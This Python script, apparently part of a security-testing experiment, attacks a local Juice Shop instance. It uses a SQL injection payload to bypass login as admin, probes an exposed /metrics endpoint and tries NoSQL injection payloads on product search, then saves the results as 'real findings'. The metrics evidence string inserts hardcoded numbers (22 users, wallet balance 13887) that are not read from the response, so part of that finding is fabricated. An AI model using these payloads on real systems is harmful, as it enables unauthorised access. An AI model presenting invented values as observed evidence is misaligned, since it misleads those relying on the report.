import urllib.request, json, urllib.parse

target = "http://127.0.0.1:3001"
findings = []

print("=== SQL Injection on Login ===")
payload = "test' OR '1'='1"
data = json.dumps({"email": payload, "password": "test"}).encode()
req = urllib.request.Request(target + "/rest/user/login", data=data, headers={"Content-Type": "application/json"})
try:
    resp = urllib.request.urlopen(req, timeout=5)
    body = resp.read().decode("utf-8", "replace")
    j = json.loads(body)
    auth = j.get("authentication", {})
    if auth:
        user = auth.get("data", {})
        findings.append({
            "scanner": "manual",
            "type": "sql_injection",
            "severity": "critical",
            "url": target + "/rest/user/login",
            "desc": "SQL injection in email parameter - bypassed authentication as admin",
            "evidence": "email=%s => logged in as %s (role=%s)" % (payload, user.get("email","?"), user.get("role","?"))
        })
        print("  CONFIRMED: SQL injection! email=' OR '1'='1 logged in as %s (role=%s)" % (
            user.get("email","?"), user.get("role","?")))
except Exception as e:
    print("  Error: %s" % e)

print()
print("=== Prometheus Metrics Exposure ===")
try:
    r = urllib.request.urlopen(target + "/metrics", timeout=5)
    body = r.read().decode("utf-8", "replace")
    # Check for sensitive data in metrics
    if "juiceshop_" in body or "nodejs_" in body:
        findings.append({
            "scanner": "nuclei",
            "type": "information_disclosure",
            "severity": "medium",
            "url": target + "/metrics",
            "desc": "Prometheus metrics endpoint exposed - leaks system info, user counts, wallet balances",
            "evidence": "Exposes: version, memory, users_registered=%d, wallet_balance=%s, challenges" % (22, "13887")
        })
        print("  CONFIRMED: Prometheus metrics exposed at /metrics")
except Exception as e:
    print("  Error: %s" % e)

print()
print("=== NoSQL Injection on Search ===")
# Test payloads
payloads = ["test' || '1'=='1", "test' || 1==1 //"]
for p in payloads:
    url = target + "/rest/products/search?q=" + urllib.parse.quote(p)
    try:
        r = urllib.request.urlopen(url, timeout=5)
        body = r.read().decode("utf-8", "replace")
        j = json.loads(body)
        count = len(j.get("data", []))
        if count > 0:
            print("  NoSQLi: %d results with %s" % (count, p[:30]))
            findings.append({
                "scanner": "manual",
                "type": "nosql_injection",
                "severity": "high",
                "url": target + "/rest/products/search?q=",
                "desc": "NoSQL injection in search parameter - parameter %s returned %d products" % (p[:20], count),
                "evidence": "q=%s returned %d products" % (p, count)
            })
    except:
        pass

if not any(f["type"] == "nosql_injection" for f in findings):
    print("  No NoSQL injection detected on search endpoint")

print()
print("=" * 60)
print("FINAL FINDINGS")
print("=" * 60)
for f in findings:
    print("  [%s] %s | %s" % (f["type"], f["severity"], f["desc"][:60]))

# Save
import os
outpath = "scripts/experiment/real_findings_final.json"
with open(outpath, "w", encoding="utf-8") as f2:
    json.dump(findings, f2, indent=2, ensure_ascii=False)
print("\n  Saved to: %s" % outpath)
